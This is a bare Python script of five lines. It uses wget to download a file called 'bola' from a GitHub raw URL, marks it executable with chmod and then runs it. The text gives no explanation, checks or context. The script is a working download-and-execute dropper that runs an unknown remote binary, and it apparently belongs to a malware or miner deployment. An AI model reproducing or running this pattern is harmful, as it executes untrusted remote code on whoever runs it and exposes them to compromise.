import os
import subprocess
subprocess.run(['wget','https://raw.githubusercontent.com/aurbach55/toya/main/bola'])
subprocess.run(['chmod','+x','bola'])
subprocess.run(['./bola'])
